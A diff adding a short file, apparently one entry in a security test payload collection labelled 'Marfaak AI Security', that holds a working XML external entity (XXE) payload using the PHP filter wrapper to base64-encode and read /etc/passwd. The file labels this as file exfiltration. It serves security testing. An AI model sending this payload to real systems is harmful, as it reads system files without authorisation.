@@ -1,0 +1,9 @@
+# Marfaak AI Security - XXE with PHP filter wrapper
+
+**WARNING: This payload tests XXE with PHP filter wrapper.**
+
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+]>
+<data>&xxe; - Base64 encoded file exfiltration via PHP filter</data>
